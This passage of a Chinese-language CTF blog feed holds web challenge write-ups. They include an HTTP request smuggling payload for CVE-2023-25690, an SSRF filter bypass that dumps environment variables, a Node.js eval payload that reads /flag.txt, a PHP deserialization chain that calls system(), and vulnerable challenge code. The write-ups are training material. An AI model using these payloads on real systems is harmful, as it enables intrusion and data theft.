class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func (p RequestData) FetchServerInfo(command string) string &#123;</span><br><span class=\"line\">\tout, err := exec.Command(&quot;sh&quot;, &quot;-c&quot;, command).Output()</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn string(out)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这里调用了一个 exec.Command 并且是调用的 sh -c 就是命令执行的意思，</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You&#x27;ve found a website that lets you input remote templates for rendering. Your task is to exploit this system&#x27;s vulnerabilities to access and retrieve a hidden flag. Good luck!</span><br></pre></td></tr></table></figure></p>\n<p>这里也说明了模板渲染，那抓包查看下面的<img data-src=\"/pic/image-20231210145451007.png\" alt=\"image-20231210145451007\" /></p>\n<p>这个页面的下面还能跳转我们要的网页，</p>\n<p><img data-src=\"/pic/image-20231210145537106.png\" alt=\"image-20231210145537106\" /></p>\n<p>这里使用的抓包可以知道 use_remote=true 并且 page 就是你需要立即渲染的地方，因为内网 ip 无法访问那么我们可以使用 webhook.site 来生成需要的内容接取</p>\n<p><img data-src=\"/pic/image-20231210145732624.png\" alt=\"image-20231210145732624\" /></p>\n<p>这里调用了.FetchServerInfo 来直接执行命令，因为我们的目标就是这个</p>\n<p><img data-src=\"/pic/image-20231210145837130.png\" alt=\"image-20231210145837130\" /></p>\n<p>命令执行成功，达到目的</p>\n<h3 id=\"apacheblaze\"><a class=\"anchor\" href=\"#apacheblaze\">#</a> ApacheBlaze</h3>\n<p>Step into the ApacheBlaze universe, a world of arcade clicky games. Rumor has it that by playing certain games, you have the chance to win a grand prize. However, before you can dive into the fun, you'll need to crack a puzzle.</p>\n<p>这个题打的我很懵</p>\n<p>我看了一下 app.py 里面的代码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Flask, request, jsonify</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">app.config[&#x27;GAMES&#x27;] = &#123;&#x27;magic_click&#x27;, &#x27;click_mania&#x27;, &#x27;hyper_clicker&#x27;, &#x27;click_topia&#x27;&#125;</span><br><span class=\"line\">app.config[&#x27;FLAG&#x27;] = &#x27;HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class=\"line\">def index():</span><br><span class=\"line\">    game = request.args.get(&#x27;game&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    if not game:</span><br><span class=\"line\">        return jsonify(&#123;</span><br><span class=\"line\">            &#x27;error&#x27;: &#x27;Empty game name is not supported!.&#x27;</span><br><span class=\"line\">        &#125;), 400</span><br><span class=\"line\"></span><br><span class=\"line\">    elif game not in app.config[&#x27;GAMES&#x27;]:</span><br><span class=\"line\">        return jsonify(&#123;</span><br><span class=\"line\">            &#x27;error&#x27;: &#x27;Invalid game name!&#x27;</span><br><span class=\"line\">        &#125;), 400</span><br><span class=\"line\"></span><br><span class=\"line\">    elif game == &#x27;click_topia&#x27;:</span><br><span class=\"line\">        if request.headers.get(&#x27;X-Forwarded-Host&#x27;) == &#x27;dev.apacheblaze.local&#x27;:</span><br><span class=\"line\">            return jsonify(&#123;</span><br><span class=\"line\">                &#x27;message&#x27;: f&#x27;&#123;app.config[&quot;FLAG&quot;]&#125;&#x27;</span><br><span class=\"line\">            &#125;), 200</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            return jsonify(&#123;</span><br><span class=\"line\">                &#x27;message&#x27;: &#x27;This game is currently available only from dev.apacheblaze.local.&#x27;</span><br><span class=\"line\">            &#125;), 200</span><br><span class=\"line\"></span><br><span class=\"line\">    else:</span><br><span class=\"line\">        return jsonify(&#123;</span><br><span class=\"line\">            &#x27;message&#x27;: &#x27;This game is currently unavailable due to internal maintenance.&#x27;</span><br><span class=\"line\">        &#125;), 200</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>还以为常规方法只要 game<mark>click_topia，以及 X-Forwarded-Host</mark>dev.apacheblaze.local 就能拿到 flag，是我大意了，试了一会发现根本出不了 flag，又去查看了一下 api.js</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$(document).ready(function() &#123;</span><br><span class=\"line\">  $(&quot;.game a&quot;).click(function(event) &#123;</span><br><span class=\"line\">      event.preventDefault();</span><br><span class=\"line\">      var gameName = $(this).attr(&quot;div&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">      $.ajax(&#123;</span><br><span class=\"line\">          url: &quot;/api/games/&quot; + gameName,</span><br><span class=\"line\">          success: function(data) &#123;</span><br><span class=\"line\">              var message = data.message;</span><br><span class=\"line\">              $(&quot;#gameplayresults&quot;).text(message);</span><br><span class=\"line\">          &#125;,</span><br><span class=\"line\">          error: function() &#123;</span><br><span class=\"line\">              $(&quot;#gameplayresults&quot;).text(&quot;Error fetching API data.&quot;);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p>查看到了里面有个 url: &quot;/api/games/&quot; + gameName, 我想到了 gameName 换成 click_topia 然后提示 app.py 里面的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">return jsonify(&#123;</span><br><span class=\"line\">               &#x27;message&#x27;: &#x27;This game is currently available only from dev.apacheblaze.local.&#x27;</span><br><span class=\"line\">           &#125;), 200</span><br></pre></td></tr></table></figure></p>\n<p>加上 X-Forwarded-Host==dev.apacheblaze.local 还是没有反应，试了很久发现还是不行，查看了大佬的 wp 发现我方法错了</p>\n<p><img data-src=\"/pic/image-20231210153436785.png\" alt=\"image-20231210153436785\" /></p>\n<p>应该向去查看 httpd.conf 的语法，里面有一个重定向，并且还设置了一个 proxy 也就说说我刚刚上面那两个其实都是一个，现在很清楚了，端口 1337 和 8080 上的 2 个虚拟主机（反向代理和负载均衡器）在请求处理期间被附加到 X-Forwarded-Host 标头。</p>\n<p>并且大佬还说了利用方法 HTTP 请求走私攻击 (CVE-2023–25690)</p>\n<p>通过这个漏洞，我们了解到我们可以在发送到目标的第一个请求中隐藏第二个请求（使用 <code>\\r\\n\\r</code>  拆分方法）。这使我们能够直接从反向代理发送请求，因此我们不会将其他内容附加到 X-Forwarded-Host 标头的末尾</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /api/games/click_topia HTTP/1.1</span><br><span class=\"line\">主机：dev.apacheblaze.local </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET / HTTP/1.1</span><br><span class=\"line\">主机：localhost:1337 </span><br><span class=\"line\"></span><br><span class=\"line\">-------------------------- ------------</span><br><span class=\"line\"></span><br><span class=\"line\">编码提醒: </span><br><span class=\"line\"></span><br><span class=\"line\">\\r\\n -&gt; %0d%0a </span><br><span class=\"line\">\\r\\n\\r -&gt; %0d%0a%0d</span><br></pre></td></tr></table></figure></p>\n<p>进行 url 编码</p>\n<p><img data-src=\"/pic/image-20231210154202586.png\" alt=\"image-20231210154202586\" /></p>\n<p>需要注意的是进行常规的 url 编码后无法编码 %0d 需要自己加上去最后是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/ HTTP/1.1</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"proxyasaservice\"><a class=\"anchor\" href=\"#proxyasaservice\">#</a> ProxyAsAService</h3>\n<p>Experience the freedom of the web with ProxyAsAService. Because online privacy and access should be for everyone, everywhere.</p>\n<p>这个题又是一个 python 写的，题目描述了代理我们一个一个文件开始看</p>\n<p>首先是 dockerfiler</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">EXPOSE 1337</span><br><span class=\"line\">ENV FLAG=HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;</span><br></pre></td></tr></table></figure></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1hcHAtMGg5ZHFxNjl3dmxweTBzM3Z3OHFwLnB5\">然后就是代码了 app.py</span></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Flask, jsonify</span><br><span class=\"line\">from application.blueprints.routes import proxy_api, debug</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">app.config.from_object(&#x27;application.config.Config&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">app.register_blueprint(proxy_api, url_prefix=&#x27;/&#x27;)</span><br><span class=\"line\">app.register_blueprint(debug, url_prefix=&#x27;/debug&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">@app.errorhandler(404)</span><br><span class=\"line\">def not_found(error):</span><br><span class=\"line\">    return jsonify(&#123;&#x27;error&#x27;: &#x27;Not Found&#x27;&#125;), 404</span><br><span class=\"line\"></span><br><span class=\"line\">@app.errorhandler(403)</span><br><span class=\"line\">def forbidden(error):</span><br><span class=\"line\">    return jsonify(&#123;&#x27;error&#x27;: &#x27;Not Allowed&#x27;&#125;), 403</span><br><span class=\"line\"></span><br><span class=\"line\">@app.errorhandler(400)</span><br><span class=\"line\">def bad_request(error):</span><br><span class=\"line\">    return jsonify(&#123;&#x27;error&#x27;: &#x27;Bad Request&#x27;&#125;), 400</span><br></pre></td></tr></table></figure></p>\n<p>里面就是一些控制报错输出查看引用包，routes</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Blueprint, request, Response, jsonify, redirect, url_for</span><br><span class=\"line\">from application.util import is_from_localhost, proxy_req</span><br><span class=\"line\">import random, os</span><br><span class=\"line\"></span><br><span class=\"line\">SITE_NAME = &#x27;reddit.com&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">proxy_api = Blueprint(&#x27;proxy_api&#x27;, __name__)</span><br><span class=\"line\">debug     = Blueprint(&#x27;debug&#x27;, __name__)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">@proxy_api.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class=\"line\">def proxy():</span><br><span class=\"line\">    url = request.args.get(&#x27;url&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    if not url:</span><br><span class=\"line\">        cat_meme_subreddits = [</span><br><span class=\"line\">            &#x27;/r/cats/&#x27;,</span><br><span class=\"line\">            &#x27;/r/catpictures&#x27;,</span><br><span class=\"line\">            &#x27;/r/catvideos/&#x27;</span><br><span class=\"line\">        ]</span><br><span class=\"line\"></span><br><span class=\"line\">        random_subreddit = random.choice(cat_meme_subreddits)</span><br><span class=\"line\"></span><br><span class=\"line\">        return redirect(url_for(&#x27;.proxy&#x27;, url=random_subreddit))</span><br><span class=\"line\">    </span><br><span class=\"line\">    target_url = f&#x27;http://&#123;SITE_NAME&#125;&#123;url&#125;&#x27;</span><br><span class=\"line\">    response, headers = proxy_req(target_url)</span><br><span class=\"line\"></span><br><span class=\"line\">    return Response(response.content, response.status_code, headers.items())</span><br><span class=\"line\"></span><br><span class=\"line\">@debug.route(&#x27;/environment&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class=\"line\">@is_from_localhost</span><br><span class=\"line\">def debug_environment():</span><br><span class=\"line\">    environment_info = &#123;</span><br><span class=\"line\">        &#x27;Environment variables&#x27;: dict(os.environ),</span><br><span class=\"line\">        &#x27;Request headers&#x27;: dict(request.headers)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    return jsonify(environment_info)</span><br></pre></td></tr></table></figure></p>\n<p>导入了 os，下面的 debug_environment (): 还调用了 os 输出了 os.environ</p>\n<p>回到 app.py 查看路由控制</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.register_blueprint(proxy_api, url_prefix=&#x27;/&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">app.register_blueprint(debug, url_prefix=&#x27;/debug&#x27;)</span><br></pre></td></tr></table></figure></p>\n<p>这里都是调用的 routes 里面的函数 proxy_api</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@proxy_api.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class=\"line\">def proxy():</span><br><span class=\"line\">    url = request.args.get(&#x27;url&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    if not url:</span><br><span class=\"line\">        cat_meme_subreddits = [</span><br><span class=\"line\">            &#x27;/r/cats/&#x27;,</span><br><span class=\"line\">            &#x27;/r/catpictures&#x27;,</span><br><span class=\"line\">            &#x27;/r/catvideos/&#x27;</span><br><span class=\"line\">        ]</span><br><span class=\"line\"></span><br><span class=\"line\">        random_subreddit = random.choice(cat_meme_subreddits)</span><br><span class=\"line\"></span><br><span class=\"line\">        return redirect(url_for(&#x27;.proxy&#x27;, url=random_subreddit))</span><br><span class=\"line\">    </span><br><span class=\"line\">    target_url = f&#x27;http://&#123;SITE_NAME&#125;&#123;url&#125;&#x27;</span><br><span class=\"line\">    response, headers = proxy_req(target_url)</span><br><span class=\"line\"></span><br><span class=\"line\">    return Response(response.content, response.status_code, headers.items())</span><br></pre></td></tr></table></figure></p>\n<p>这个代码控制了用户的默认界面为这 3 个中的随机一个然后就是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@debug.route(&#x27;/environment&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class=\"line\">@is_from_localhost</span><br><span class=\"line\">def debug_environment():</span><br><span class=\"line\">    environment_info = &#123;</span><br><span class=\"line\">        &#x27;Environment variables&#x27;: dict(os.environ),</span><br><span class=\"line\">        &#x27;Request headers&#x27;: dict(request.headers)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    return jsonify(environment_info)</span><br></pre></td></tr></table></figure></p>\n<p>也就是说只要调用了 /debug/environment 就能得到 flag</p>\n<p>需要注意的是 @is_from_localhost 调用了一个过滤函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RESTRICTED_URLS = [&#x27;localhost&#x27;, &#x27;127.&#x27;, &#x27;192.168.&#x27;, &#x27;10.&#x27;, &#x27;172.&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">def is_safe_url(url):</span><br><span class=\"line\">    for restricted_url in RESTRICTED_URLS:</span><br><span class=\"line\">        if restricted_url in url:</span><br><span class=\"line\">            return False</span><br><span class=\"line\">    return True</span><br><span class=\"line\"></span><br><span class=\"line\">def is_from_localhost(func):</span><br><span class=\"line\">    @functools.wraps(func)</span><br><span class=\"line\">    def check_ip(*args, **kwargs):</span><br><span class=\"line\">        if request.remote_addr != &#x27;127.0.0.1&#x27;:</span><br><span class=\"line\">            return abort(403)</span><br><span class=\"line\">        return func(*args, **kwargs)</span><br><span class=\"line\">    return check_ip</span><br></pre></td></tr></table></figure></p>\n<p>这里过滤了 127.0.0.1 那我们可以使用 0.0.0.0 也是可以的，</p>\n<p>使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://188.166.175.58:31579/?url=@0.0.0.0:1337/debug/environment</span><br></pre></td></tr></table></figure></p>\n<p>即可绕过</p>\n<h3 id=\"jscalc\"><a class=\"anchor\" href=\"#jscalc\">#</a> jscalc</h3>\n<p>这个题比较简单使用 js 的 fs</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /api/calculate HTTP/1.1</span><br><span class=\"line\">Host: 188.166.175.58:31222</span><br><span class=\"line\">Content-Length: 65</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Accept: */*</span><br><span class=\"line\">Origin: http://188.166.175.58:31222</span><br><span class=\"line\">Referer: http://188.166.175.58:31222/</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;formula&quot;:&quot;require(&#x27;fs&#x27;).readFileSync(&#x27;/flag.txt&#x27;).toString();&quot;&#125;</span><br></pre></td></tr></table></figure></p>\n<p>直接得到 flag</p>\n",
            "tags": [
                "WEB"
            ]
        },
        {
            "id": "https://lookhui.github.io/WEB%E5%88%B7%E9%A2%98-md/",
            "url": "https://lookhui.github.io/WEB%E5%88%B7%E9%A2%98-md/",
            "title": "WEB刷题解析",
            "date_published": "2023-12-12T13:39:15.000Z",
            "content_html": "<h5 id=\"hznuctf-2023-preliminaryppppop\"><a class=\"anchor\" href=\"#hznuctf-2023-preliminaryppppop\">#</a> [HZNUCTF 2023 preliminary]ppppop</h5>\n<p>打开页面没有显示东西打开 f12 查看网络有一个 cookie:user 尝试将字符串进行 base64 解密发现是一个验证已经显示是 isadmin 那么在让他变成 1 就行，然后输入 header 里面去查看到源码就是一个反序列化，我们要注意的是 strrev 和 python 的 [::-1] 一样将字符串反转</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class A &#123;</span><br><span class=\"line\">    public $className=&quot;B&quot;;</span><br><span class=\"line\">    public $funcName=&quot;system&quot;;</span><br><span class=\"line\">    public $args=&quot;env&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __destruct() &#123;</span><br><span class=\"line\">        $class = new $this-&gt;className;</span><br><span class=\"line\">        $funcName = $this-&gt;funcName;</span><br><span class=\"line\">        $class-&gt;$funcName($this-&gt;args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class B &#123;</span><br><span class=\"line\">    public function __call($func, $arg) &#123;</span><br><span class=\"line\">        $func($arg[0]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a=new A();</span><br><span class=\"line\">echo strrev(serialize($a));</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hznuctf-2023-preliminaryguessguessguess\"><a class=\"anchor\" href=\"#hznuctf-2023-preliminaryguessguessguess\">#</a> [HZNUCTF 2023 preliminary]guessguessguess</h5>\n<p>很简单直接使用 python 的 [::-1] 即可得到 strrev 反过来的，<br />\n贴上源码这个题我打不开环境</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">  $userArr = array(&quot;username: admin&lt;br&gt;password: admin&quot;,&quot;username: docker&lt;br&gt;password: docker&quot;, &quot;username: mxx307&lt;br&gt;password: mxxxxxxx3333000777&quot;, &quot;username: FLAG_IN_HERE&lt;br&gt;password: 不给你看&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$cmd = strrev($_POST[&#x27;cmd&#x27;]);</span><br><span class=\"line\">if($cmd != &#x27;hint&#x27; &amp;&amp; $cmd != &#x27;phpinfo&#x27;)&#123;</span><br><span class=\"line\">  echo &quot;your SQL: SELECT * FROM users WHERE id=$cmd&quot;;</span><br><span class=\"line\">  echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if($cmd == &quot;phpinfo&quot;) &#123;</span><br><span class=\"line\">  eval(&#x27;phpinfo();&#x27;);</span><br><span class=\"line\">&#125; else if(preg_match(&#x27;/127.0.0.1/&#x27;,$cmd) &amp;&amp; !preg_match(&#x27;/;|&amp;/&#x27;,$cmd )) &#123;</span><br><span class=\"line\">  system(&#x27;ping &#x27;.$cmd);</span><br><span class=\"line\">&#125; else if($cmd == &quot;hint&quot;) &#123;</span><br><span class=\"line\">  echo &#x27;可爱的CTFer哟,你掉的是这个金&quot;命令执行&quot;,还是这个银&quot;XSS&quot;还是这个普通的&quot;SQL注入&quot;呢?&#x27;;</span><br><span class=\"line\">&#125;else if(preg_match(&#x27;/^\\d$/&#x27;,$cmd, $matches)) &#123;</span><br><span class=\"line\">  if($matches[0] &lt;= 4 &amp;&amp; $matches[0] &gt;= 1)&#123;</span><br><span class=\"line\">    echo $userArr[$matches[0] - 1];</span><br><span class=\"line\">  &#125; else &#123;</span><br><span class=\"line\">    echo &quot;no user&quot;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;else &#123;</span><br><span class=\"line\">  echo &quot;猜猜猜&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"fsctf-2023webshell是啥捏\"><a class=\"anchor\" href=\"#fsctf-2023webshell是啥捏\">#</a> [FSCTF 2023] webshell 是啥捏</h5>\n<p>很简单的一个题直接把</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td 